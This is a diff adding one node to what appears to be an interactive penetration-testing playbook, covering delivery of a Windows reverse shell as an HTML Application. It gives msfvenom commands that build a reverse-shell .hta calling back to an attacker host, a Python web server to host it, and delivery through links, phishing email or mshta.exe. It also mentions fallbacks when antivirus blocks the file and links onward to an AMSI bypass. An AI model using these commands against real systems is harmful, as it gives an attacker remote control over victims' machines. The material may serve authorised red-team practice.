@@ -1,0 +1,26 @@
+{
+  "id": "client_side_hta",
+  "phase": "SHELL",
+  "title": "Client-Side \u2014 HTA",
+  "body": "An HTA is a single HTML Application that runs via mshta.exe with full local privileges of the user. One file, no Office. Good when you can get the target to open an .hta from a link or attachment.",
+  "cmd": "# Generate HTA reverse shell\nmsfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta\npython3 -m http.server 80\n# Deliver: http://$lhost/shell.hta  (runs via mshta.exe on click)\n\n# Or a download-cradle HTA body calling your PS payload:\n#   mshta.exe http://$lhost/shell.hta",
+  "warn": "mshta is increasingly flagged/restricted by AV and app-control. If it dies, fall back to the library+lnk chain or macro_pack-generated formats.",
+  "choices": [
+    {
+      "label": "Deliver by email (swaks)",
+      "next": "client_side_phish_email"
+    },
+    {
+      "label": "Got shell \u2014 upgrade",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "AV killed it",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Back to client-side options",
+      "next": "client_side"
+    }
+  ]
+}
